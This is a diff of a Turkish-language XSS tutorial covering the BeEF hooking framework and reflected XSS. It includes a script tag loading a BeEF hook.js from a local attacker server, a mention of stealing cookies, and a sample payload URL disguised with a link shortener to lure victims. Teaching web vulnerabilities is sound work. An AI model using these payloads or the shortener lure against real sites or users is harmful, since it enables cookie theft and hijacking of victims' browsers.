@@ -78,3 +78,19 @@ Beef'i çalıştırdıktan sonra terminalde çıkan 2 ip.
 "<script>alert()</script>" ile xss'in tespit edildiği yerde "<script src="http://127.0.0.1:3000/hook.js"></script>" çalıştırıyoruz ve beef panelinde online browsers kısmında siteyi görüyoruz. Burdan sonra command kısmında gelip cookielerin çalınmasından sosyal mühendislik saldırılarına kadar pek çok şey yapılabilir.
 
 ## **Reflected XSS**
+
+Şimdiye kadar anlatılan xss aslında reflected xss idi. Türkçesi yansıyan xss anlamına gelen bu zafiyet türü, requesti gönderen bir kişinin browser'ında gerçekleşir. Birçok kullanıcının request-response cycle'ı vardır ve bunlar birbirinden bağımsızdır. Bu yüzden de bir saldırgan reflected xss bulduğu zaman bu başka kullanıcılar tarafından görülmez. 
+
+Url shortener sitesine aşağıdaki url'i verildiğinde
+
+```
+http://boylebirsiteyok/?keyword=<script>alert(1)</script>
+```
+
+böyle bir url'e dönüştürecektir.
+
+```
+https://shorturl.at/mh965
+```
+
+Bu url'e tıklayan bir kullanıcı, hedef websitesine gider ve giderken browser tüm cookieleri ekler.
